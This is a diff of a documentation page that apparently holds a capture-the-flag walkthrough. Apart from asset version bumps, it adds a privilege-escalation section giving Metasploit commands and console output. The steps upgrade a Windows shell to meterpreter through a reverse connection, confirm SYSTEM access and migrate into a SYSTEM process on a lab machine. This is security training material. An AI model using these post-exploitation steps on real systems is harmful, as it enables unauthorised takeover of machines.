@@ -35,11 +35,11 @@
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="/static/favicon.ico" rel="icon" />
-    <link href="/resources/css/retype.css?v=2.2.706896364464" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=2.2.706898230882" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=2.2.706896364464" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=2.2.706898230882" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.706896364464" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.706898230882" defer></script>
 </head>
 <body>
     <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=G-77BVC9KX4X" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
@@ -433,10 +433,85 @@ VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
         </div>
     </div>
 </div>
-<doc-anchor-target id="escalate">
+<doc-anchor-target id="privilege-escalation">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#escalate">#</doc-anchor-trigger>
-        <span>Escalate</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
+        <span>Privilege Escalation</span>
+    </h3>
+</doc-anchor-target>
+<p><strong>If you haven&#x27;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</strong></p>
+<p>Background the shell now with <kbd>CTRL</kbd> + <kbd>Z</kbd>.</p>
+<doc-panel id="reveal-answer" collapsed>
+    <template #title>Reveal Answer</template>
+<p><code v-pre>use post/multi/manage/shell_to_meterpreter</code></p>
+</doc-panel>
+<p><strong>Select this (use MODULE_PATH). Show options, what option are we required to change?</strong></p>
+<p>Type in the command <code v-pre>use post/multi/manage/shell_to_meterpreter</code>. Now use <code v-pre>show options</code> to list the arguments. What option is required but not set?</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Module options (post/multi/manage/shell_to_meterpreter):                                                                                                                      
+                                                                                                                                                                            
+Name     Current Setting  Required  Description                                                                                                                            
+----     ---------------  --------  -----------                                                                                                                            
+HANDLER  true             yes       Start an exploit/multi/handler to receive the connection                                                                               
+LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).                                                
+LPORT    4433             yes       Port for payload to connect to.                                                                                                        
+SESSION                   yes       The session to run this module on</code></pre>
+</doc-codeblock></div>
+<doc-panel id="reveal-answer" collapsed>
+    <template #title>Reveal Answer</template>
+<p>SESSION</p>
+</doc-panel>
+<p>Now type <code v-pre>sessions</code> in your terminal. Set the session with command <code v-pre>set SESSION &lt;SESSION_ID&gt;</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Active sessions                                                                                                                                                               
+===============                                                                                                                                                               
+                                                                                                                                                                            
+Id  Name  Type               Information                                               Connection                                                                           
+--  ----  ----               -----------                                               ----------                                                                           
+1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -&gt; 10.10.209.54:49233 (10.10.209.54)</code></pre>
+</doc-codeblock></div>
+<p>Run the post exploit using command <code v-pre>run</code>. If it doesn&#x27;t work the first time, run the exploit again.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.18.96.75:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) &gt; 
+[*] Sending stage (200774 bytes) to 10.10.209.54
+[*] Meterpreter session 2 opened (10.18.96.75:4433 -&gt; 10.10.209.54:49261) at 2022-05-26 12:22:59 -0400
+[*] Stopping exploit/multi/handler</code></pre>
+</doc-codeblock></div>
+<p>This will create a second session. Type in <code v-pre>sessions</code> to list them both. Note that session 2 is the meterpreter session.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Active sessions
+===============
+
+Id  Name  Type                     Information                                               Connection
+--  ----  ----                     -----------                                               ----------
+1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -&gt; 10.10.209.54:49233 (10.10.209.54)
+2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.96.75:4433 -&gt; 10.10.209.54:49261 (10.10.209.54)</code></pre>
+</doc-codeblock></div>
+<p>To get in the meterpreter session use the command <code v-pre>sessions &lt;SESSION_ID&gt;</code>. Now run the <code v-pre>getsystem</code> command to verify if we successfully escalated our privileges to <code v-pre>NT AUTHORITY\SYSTEM</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; getsystem
+[-] Already running as SYSTEM</code></pre>
+</doc-codeblock></div>
+<p>Now run the <code v-pre>ps</code> command to list all the running processes on the traget machine.</p>
+<p><figure class="content-center">
+    <img src="/static/images/exploit-ps.png" alt="Running processes on target machine" />
+    <figcaption class="caption">Running processes on target machine</figcaption>
+</figure>
+</p>
+<p>Migrate a process that is running under <code v-pre>NT AUTHORITY\SYSTEM</code> with the command <code v-pre>migrate [pid]</code>. It case it fails, chose another process id.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; migrate 700
+[*] Migrating from 1448 to 700...
+[*] Migration completed successfully.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cracking">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cracking">#</doc-anchor-trigger>
+        <span>Cracking</span>
     </h3>
 </doc-anchor-target>
 
